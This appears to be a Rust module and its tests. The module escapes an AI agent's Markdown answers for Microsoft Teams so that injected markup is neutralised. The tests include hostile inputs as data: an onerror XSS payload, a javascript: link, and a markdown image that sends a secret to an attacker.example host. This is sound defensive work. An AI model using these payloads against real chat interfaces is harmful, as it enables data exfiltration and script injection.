//! An agent's answer as the bot writes it in Teams (ADR-140), in the
//! Markdown Teams reads: rebuilt from what the gateways read of it
//! (emphasis, headings, list items, web links), everything else escaped
//! (`escaped`), so that nothing in it reads as Markdown the agent did not
//! write, nor as HTML. A heading is written in bold, a list item as `- `,
//! an empty one as an empty line, a line of `=` escaped; emphasis is not nested (a span holds no
//! other). Code,
//! in spans or fenced blocks, is kept as written, its HTML characters
//! escaped; a fenced block left open is closed.

use super::text::escaped;
use crate::gateways::markdown::{BOLD, HEADING, ITALIC, ITEM, LINK};

/// `markdown` (an agent's answer) in Teams' Markdown, escaped.
pub fn from_markdown(markdown: &str) -> String {
    let mut lines = Vec::new();
    let mut code: Option<Vec<String>> = None;
    for line in markdown.lines() {
        if line.trim_start().starts_with("```") {
            match code.take() {
                Some(block) => lines.push(fenced(&block)),
                None => code = Some(Vec::new()),
            }
        } else if let Some(block) = code.as_mut() {
            block.push(html_escaped(line));
        } else if let Some(heading) = HEADING.captures(line) {
            let text = heading[1].trim();
            lines.push(if text.is_empty() {
                // Written `** **`, it would read as a rule.
                String::new()
            } else {
                format!("**{}**", escaped(text))
            });
        } else if is_underline(line) {
            // A line of `=` would make the line before a heading.
            lines.push(format!("\\{}", line.trim()));
        } else if let Some(item) = ITEM.captures(line) {
            lines.push(if item[2].trim().is_empty() {
                // A lone `- ` would make the line before a heading.
                String::new()
            } else {
                format!("{}- {}", &item[1], inline(&item[2]))
            });
        } else {
            lines.push(inline(line));
        }
    }
    if let Some(block) = code {
        lines.push(fenced(&block));
    }
    lines.join("\n")
}

/// Whether `line` is only `=`, which underlines the line before as a
/// heading.
fn is_underline(line: &str) -> bool {
    let line = line.trim();
    !line.is_empty() && line.chars().all(|c| c == '=')
}

fn fenced(block: &[String]) -> String {
    format!("```\n{}\n```", block.join("\n"))
}

/// What only HTML would read, written as entities.
fn html_escaped(text: &str) -> String {
    text.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

/// A line's text, its code spans kept: a single backtick and the next
/// backtick, when single too, around what they hold. Every other backtick
/// (one of a run, or one left open) is written escaped: the backticks left
/// as they are only open and close the spans kept, which hold none, so
/// Markdown pairs them as here, whatever runs the agent wrote.
fn inline(line: &str) -> String {
    let runs = backtick_runs(line);
    let mut out = String::new();
    let mut rest = 0;
    let mut i = 0;
    while let Some(&(start, len)) = runs.get(i) {
        out.push_str(&prose(&line[rest..start]));
        match runs.get(i + 1) {
            Some(&(end, 1)) if len == 1 => {
                out.push_str(&format!("`{}`", html_escaped(&line[start + 1..end])));
                rest = end + 1;
                i += 2;
            }
            _ => {
                out.push_str(&"\\`".repeat(len));
                rest = start + len;
                i += 1;
            }
        }
    }
    out.push_str(&prose(&line[rest..]));
    out
}

/// Where each run of backticks of `line` starts, and how long it is.
fn backtick_runs(line: &str) -> Vec<(usize, usize)> {
    let mut runs: Vec<(usize, usize)> = Vec::new();
    for (at, c) in line.char_indices() {
        if c != '`' {
            continue;
        }
        match runs.last_mut() {
            Some((start, len)) if *start + *len == at => *len += 1,
            _ => runs.push((at, 1)),
        }
    }
    runs
}

/// Text outside code: its web links kept, the rest escaped with its
/// emphasis.
fn prose(text: &str) -> String {
    let mut out = String::new();
    let mut rest = 0;
    for found in LINK.captures_iter(text) {
        let whole = found.get(0).expect("the match");
        out.push_str(&emphasis(&text[rest..whole.start()]));
        out.push_str(&web_link(&found[2], &found[1]));
        rest = whole.end();
    }
    out.push_str(&emphasis(&text[rest..]));
    out
}

/// A web link the agent wrote: kept when its address holds nothing that
/// Markdown or HTML would read; otherwise its label, then its address,
/// both escaped.
fn web_link(url: &str, label: &str) -> String {
    let plain = url.chars().all(|c| {
        c.is_ascii_alphanumeric()
            || matches!(
                c,
                '/' | ':'
                    | '.'
                    | '-'
                    | '_'
                    | '#'
                    | '~'
                    | '='
                    | '%'
                    | '?'
                    | '&'
                    | '+'
                    | ','
                    | ';'
                    | '@'
                    | '!'
                    | '$'
            )
    });
    if plain {
        format!("[{}]({url})", escaped(label))
    } else {
        format!("{} ({})", escaped(label), escaped(url))
    }
}

/// `text`'s bold spans, then the italic ones between them, kept; all
/// escaped.
fn emphasis(text: &str) -> String {
    let mut out = String::new();
    let mut rest = 0;
    for found in BOLD.captures_iter(text) {
        let whole = found.get(0).expect("the match");
        let inner = found
            .get(1)
            .or_else(|| found.get(2))
            .map_or("", |m| m.as_str());
        out.push_str(&italic(&text[rest..whole.start()]));
        out.push_str(&format!("**{}**", escaped(inner)));
        rest = whole.end();
    }
    out.push_str(&italic(&text[rest..]));
    out
}

fn italic(text: &str) -> String {
    let mut out = String::new();
    let mut rest = 0;
    for found in ITALIC.captures_iter(text) {
        let whole = found.get(0).expect("the match");
        out.push_str(&escaped(&text[rest..whole.start()]));
        out.push_str(&format!("*{}*", escaped(&found[1])));
        rest = whole.end();
    }
    out.push_str(&escaped(&text[rest..]));
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_answer_keeps_its_markdown_and_nothing_else() {
        assert_eq!(
            from_markdown("**Trois** visites, dont *une* <demain> & 2 [ici](x)."),
            "**Trois** visites, dont *une* &lt;demain&gt; &amp; 2 \\[ici\\]\\(x\\)\\."
        );
        assert_eq!(
            from_markdown("## Planning\n- Lyon : `B-12`\n  * Paris"),
            "**Planning**\n- Lyon : `B-12`\n  - Paris"
        );
        assert_eq!(
            from_markdown("Voir [le site](https://ex.example/a?b=1&c=2)."),
            "Voir [le site](https://ex.example/a?b=1&c=2)\\."
        );
    }

    #[test]
    fn nothing_the_agent_did_not_write_as_markdown_reads_as_markup() {
        // HTML, and a link whose address would close it or hold markup.
        assert_eq!(
            from_markdown("<img src=x onerror=alert(1)>"),
            "&lt;img src=x onerror=alert\\(1\\)&gt;"
        );
        assert_eq!(
            from_markdown("[clic](https://ex.example/\"a*b\")"),
            "clic (https://ex\\.example/\"a\\*b\")"
        );
        // An underscore, a lone star, a backtick left open.
        assert_eq!(from_markdown("a_b * c `d"), "a\\_b \\* c \\`d");
        // Runs of backticks: escaped one by one, never shifting which
        // backticks Markdown pairs, so that nothing held between them is
        // read as an image, a link or emphasis.
        assert_eq!(
            from_markdown("x`a```b`![](https://attacker.example/p.png?d=SECRET)`y`"),
            "x\\`a\\`\\`\\`b`![](https://attacker.example/p.png?d=SECRET)`y\\`"
        );
        assert_eq!(
            from_markdown("``a``![i](https://ex.example/p.png)"),
            "\\`\\`a\\`\\`\\![i](https://ex.example/p.png)"
        );
        assert_eq!(
            from_markdown("a```b`[clic](javascript:alert(1))`c _it_"),
            "a\\`\\`\\`b`[clic](javascript:alert(1))`c \\_it\\_"
        );
        // Spans side by side with escaped backticks.
        assert_eq!(from_markdown("`a`b``c`d`"), "`a`b\\`\\`c`d`");
        assert_eq!(from_markdown("\\`a`"), "\\\\`a`");
        // Bold, then italic.
        assert_eq!(from_markdown("**a** et *b*"), "**a** et *b*");
        // An empty heading or item: an empty line, neither a rule nor a
        // heading made of the line before.
        assert_eq!(from_markdown("Titre\n#  \n+ \n* x"), "Titre\n\n\n- x");
        assert_eq!(from_markdown("~\n~~~\n+ "), "\\~\n\\~\\~\\~\n");
        assert_eq!(from_markdown("Titre\n === "), "Titre\n\\===");
    }

    #[test]
    fn code_is_kept_as_written_its_html_escaped() {
        assert_eq!(
            from_markdown("```\nif a < b { *x }\n```\nfin"),
            "```\nif a &lt; b { *x }\n```\nfin"
        );
        // A block left open is closed.
        assert_eq!(from_markdown("```\nlet a = 1;"), "```\nlet a = 1;\n```");
    }
}
